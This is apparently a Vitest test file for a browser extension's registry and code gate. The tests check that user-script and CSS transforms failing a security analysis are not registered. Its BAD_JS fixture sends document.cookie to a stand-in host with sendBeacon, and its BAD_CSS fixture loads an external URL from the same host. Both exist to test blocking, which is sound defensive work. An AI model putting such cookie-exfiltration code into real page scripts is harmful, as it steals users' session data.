import { beforeEach, describe, expect, it, vi } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import type { Settings, Transform } from '@shared/types'

/*
 * The registry talks to the extension APIs and to storage, so both are
 * replaced. What is under test is which transforms reach `register`.
 */
const registered: string[] = []
let stored: Transform[] = []
let settings: Settings = { ...DEFAULT_SETTINGS }

vi.mock('./storage', () => ({
  getAllTransforms: async () => stored,
  getSettings: async () => settings,
}))
// The per-site off list is read at registration; none is turned off here.
vi.mock('./site-off', () => ({ getOffHosts: async () => [] }))
// The excluded-sites list is read at registration too (#131); none is set here.
vi.mock('./excluded-sites', () => ({ getExcludedSites: async () => [] }))
vi.mock('./userscripts-api', () => ({
  userScripts: {
    unregister: async () => {},
    configureWorld: async () => {},
    getScripts: async () => [],
    update: async () => {},
    register: async (scripts: { id: string }[]) => {
      for (const script of scripts) registered.push(script.id)
    },
  },
}))

const { blockedStates, problemWithStoredCode } = await import('./code-gate')
const { registerTransform, reregisterAll } = await import('./registry')

const base = (over: Partial<Transform>): Transform => ({
  id: 't',
  name: 'T',
  enabled: true,
  order: 0,
  match: 'shop.example.com/*',
  kind: 'js',
  origin: 'ai',
  capabilities: [],
  intent: 'x',
  rationale: { targets: '', approach: '', assumptions: [] },
  anchor: { tag: 'div', classes: [], path: '', landmarks: [], selector: 'div' },
  code: '',
  createdAt: 0,
  updatedAt: 0,
  ...over,
})

/** Passes the analyser today. */
const GOOD_JS = "document.querySelector('aside').style.display = 'none'"
/** Copies navigator into a variable, which the allowlist refuses. */
const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', document.cookie)"
const GOOD_CSS = 'aside { display: none }'
const BAD_CSS = 'a { background: url(https://evil.example/t) }'

const sessionStore = new Map<string, unknown>()

beforeEach(() => {
  registered.length = 0
  settings = { ...DEFAULT_SETTINGS }
  sessionStore.clear()
  vi.stubGlobal('browser', {
    permissions: { contains: async () => true },
    // Holds the error tokens that registrations keep in storage.session (#123).
    storage: {
      session: {
        get: async (key: string) => (sessionStore.has(key) ? { [key]: sessionStore.get(key) } : {}),
        set: async (items: Record<string, unknown>) => {
          for (const [key, value] of Object.entries(items)) sessionStore.set(key, value)
        },
      },
    },
  })
})

describe('re-registering stored JavaScript', () => {
  it('registers code that passes and skips code that no longer does', async () => {
    stored = [
      base({ id: 'good', code: GOOD_JS }),
      base({ id: 'bad', code: BAD_JS }),
    ]
    const outcome = await reregisterAll()
    expect(registered).toEqual(['good'])
    expect(outcome).toEqual({ registered: 1, skipped: 1, endedPreviews: [] })
  })

  it('does not register a single failing script either', async () => {
    expect(await registerTransform(base({ id: 'bad', code: BAD_JS }))).toBe(false)
    expect(registered).toEqual([])
    expect(await registerTransform(base({ id: 'good', code: GOOD_JS }))).toBe(true)
    expect(registered).toEqual(['good'])
  })

  it('lets the CSP probe through when asked, because it must attempt network access', async () => {
    expect(await registerTransform(base({ id: 'probe', code: BAD_JS }), { skipAnalysis: true })).toBe(true)
    expect(registered).toEqual(['probe'])
  })
})

describe('problemWithStoredCode', () => {
  it('is null for code that passes', () => {
    expect(problemWithStoredCode(base({ code: GOOD_JS }), settings)).toBeNull()
    expect(problemWithStoredCode(base({ kind: 'css', code: GOOD_CSS }), settings)).toBeNull()
  })

  it('explains why JavaScript and CSS that fail may not run', () => {
    expect(problemWithStoredCode(base({ code: BAD_JS }), settings)).toMatch(/not running/)
    const css = problemWithStoredCode(base({ kind: 'css', code: BAD_CSS }), settings, 'https://shop.example.com/')
    expect(css).toMatch(/not running/)
    expect(css).toMatch(/evil\.example/)
  })

  it('checks CSS against the page it is applied to and the stored approvals', () => {
    const t = base({ kind: 'css', code: BAD_CSS })
    settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'list-external' } }
    expect(problemWithStoredCode(t, settings, 'https://shop.example.com/')).not.toBeNull()
    const approved = { ...t, approvedCssUrls: ['https://evil.example/t'] }
    expect(problemWithStoredCode(approved, settings, 'https://shop.example.com/')).toBeNull()
    // Same transform on a site without the setting: the approval does not carry over.
    expect(problemWithStoredCode(approved, settings, 'https://other.test/')).not.toBeNull()
  })

  it('ignores a transform that has no code', () => {
    expect(problemWithStoredCode(base({ code: '' }), settings)).toBeNull()
  })
})

describe('blockedStates', () => {
  it('lists only the failing transforms, as broken', () => {
    const states = blockedStates(
      [
        base({ id: 'a', code: GOOD_JS }),
        base({ id: 'b', code: BAD_JS }),
        base({ id: 'c', kind: 'css', code: BAD_CSS }),
        base({ id: 'd', kind: 'css', code: GOOD_CSS }),
      ],
      settings,
      'https://shop.example.com/',
    )
    expect(states.map((s) => [s.id, s.status])).toEqual([
      ['b', 'broken'],
      ['c', 'broken'],
    ])
    expect(states[0]?.brokenReason).toBeTruthy()
  })
})

describe('code in the MAIN world without the record of approval (#151)', () => {
  it('is not registered, and is unregistered as blocked', async () => {
    expect(await registerTransform(base({ id: 'main', code: GOOD_JS, world: 'MAIN' }))).toBe(false)
    expect(registered).toEqual([])
  })

  it('control: the same code registers with the record, and in the isolated world without it', async () => {
    expect(await registerTransform(base({ id: 'ok', code: GOOD_JS, world: 'MAIN', mainApprovedByUser: true }))).toBe(true)
    expect(await registerTransform(base({ id: 'iso', code: GOOD_JS, world: 'USER_SCRIPT' }))).toBe(true)
    expect(await registerTransform(base({ id: 'none', code: GOOD_JS }))).toBe(true)
    expect(registered).toEqual(['ok', 'iso', 'none'])
  })

  it('is reported as broken with a plain reason, and the rebuild skips it', async () => {
    const records = [
      base({ id: 'main', code: GOOD_JS, world: 'MAIN' }),
      base({ id: 'ok', code: GOOD_JS, world: 'MAIN', mainApprovedByUser: true }),
    ]
    expect(blockedStates(records, settings).map((s) => [s.id, s.status])).toEqual([['main', 'broken']])
    expect(problemWithStoredCode(records[0]!, settings)).toMatch(/not approved/)
    stored = records
    expect(await reregisterAll()).toMatchObject({ registered: 1, skipped: 1 })
    expect(registered).toEqual(['ok'])
  })
})
